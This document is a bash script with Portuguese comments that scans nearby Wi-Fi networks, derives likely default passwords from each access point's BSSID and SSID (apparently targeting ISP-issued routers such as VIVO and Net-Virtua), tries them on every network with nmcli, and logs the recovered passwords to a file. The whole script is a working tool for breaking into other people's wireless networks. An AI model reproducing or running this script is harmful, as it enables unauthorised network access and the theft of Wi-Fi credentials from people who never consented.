#!/bin/bash
# Generate the file to store BSSID and SSID 
# Detecting interfaces in your system
# Packages need:
# 	network-menager 
#	wireless-tools
# 	Driver da placa de rede sem fio
#		firmware-misc-nonfree

RED="\033[1;31m"
GREEN="\033[1;32m"
NOCOLOR="\033[0m"

iwconfig | grep -E "^w" > /tmp/devices
clear
cat /tmp/devices | cut -f 1 -d " "
echo "Choice your device to attack..."
read DEV
clear
#echo "Generating file with all wi-fi arround you."
#echo ""
`iw dev ${DEV} scan | grep -Ei "(^BSS|.SSID: )" | sed "N;s/\n//g" | sed "s/"\(on.*\)"//g" | sed "s/BSS //g" | sed "s/.SSID: /;/g" > /tmp/wifi.db`
# Variable that will be a file with all BSS and SSID 
FILE_DB="/tmp/wifi.db"
# Content of the file
# Output
# 88:de:7c:ce:fc:28;VIVO-FC29
# 10:62:d0:27:52:c6;Net-Virtua-0810
clear
cat $FILE_DB | while read LINE;
do

        # The target will be a SSID 
        TARGET=`echo ${LINE} | cut -d ";" -f 2 | grep -v "^$"`

        # The password will be the last fuor octets in upper case.
        PASS1=`echo ${LINE} | cut -d ";" -f 1 | cut -d ":" -f 3-6 | tr -d ":" | grep -v "^$" | grep -v "associated"`
        PASS2_1=`echo ${LINE} | cut -d ";" -f 1 | cut -d ":" -f 3-5 | tr -d ":" | grep -v "^$" | grep -v "associated"`
        PASS2_2=`echo ${LINE} | cut -d ";" -f 2 | grep -o '..$'`
        PASS2=${PASS2_1}${PASS2_2}
        echo -e "Tring first password ${RED}${PASS1^^}${NOCOLOR} in target ${GREEN}${TARGET}${NOCOLOR}"
        nmcli dev wifi connect "${TARGET}" password "${PASS1^^}" > /tmp/status
	grep -E "sucesso" /tmp/status 2>/dev/null 1>&2 
	if [[ ${?} = "0" ]]
	then
		echo "" >> ./default-passwords.txt
		nmcli dev wifi show-password >> ./default-passwords.txt
		nmcli dev wifi show-password
		nmcli --wait 5 device disconnect ${DEV} 2>/dev/null 1>&2
	fi
	
        echo -e "Tring second password ${RED}${PASS2^^}${NOCOLOR} in target ${GREEN}${TARGET}${NOCOLOR}"
        nmcli dev wifi connect "${TARGET}" password "${PASS2^^}" > /tmp/status
	grep -E "sucesso" /tmp/status 2>/dev/null 1>&2 
	if [[ ${?} = "0" ]]
	then
		nmcli dev wifi show-password >> ./default-passwords.txt
		nmcli dev wifi show-password
		nmcli --wait 5 device disconnect ${DEV} 2>/dev/null 1>&2
		echo "" >> ./default-passwords.txt
		echo "" >> ./default-passwords.txt
	fi
        echo ""
	nmcli --wait 5 device disconnect ${DEV} 2>/dev/null 1>&2
	nmcli --wait 5 device disconnect ${DEV} 2>/dev/null 1>&2
	sleep 5
	#clear

done
#> /tmp/wifi.db
